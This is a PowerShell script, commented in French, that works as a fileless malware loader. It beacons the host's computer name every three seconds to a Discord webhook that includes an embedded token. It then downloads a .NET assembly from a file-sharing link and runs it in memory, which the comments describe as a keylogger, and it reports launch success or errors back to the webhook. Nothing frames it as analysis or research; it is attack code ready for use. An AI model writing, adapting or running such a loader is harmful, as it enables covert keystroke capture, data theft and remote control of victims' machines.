$webhook = "https://discord.com/api/webhooks/1318280027363606589/FkAnJDBzgFUo3A7YeocKsc8PbojYTWuE0-_BTNn7SunjxTokeWNOVpHk_dN9Uh5XqrOW"

# Ping toutes les 3 sec
while ($true) {
    try {
        iwr $webhook -Method Post -Body (@{content="PING – $env:COMPUTERNAME – $(Get-Date -Format 'HH:mm:ss')"} | ConvertTo-Json) -ContentType 'application/json' -UseBasicParsing | Out-Null
    } catch {}
    Start-Sleep -Seconds 3

    # Lance ton keylogger en mémoire (une seule fois)
    if (-not $global:ran) {
        try {
            $bytes = (New-Object Net.WebClient).DownloadData('https://limewire.com/d/e7ZYI#KTxZOpKpll')
            $asm = [Reflection.Assembly]::Load($bytes)
            $asm.EntryPoint.Invoke($null,$null)
            $global:ran = $true
            iwr $webhook -Method Post -Body (@{content="KEYLOGGER LANCÉ EN RAM – logs en cours"} | ConvertTo-Json) -ContentType 'application/json' -UseBasicParsing | Out-Null
        } catch {
            iwr $webhook -Method Post -Body (@{content="ERREUR lancement keylogger : $($_.Exception.Message)"} | ConvertTo-Json) -ContentType 'application/json' -UseBasicParsing | Out-Null
        }
    }
}
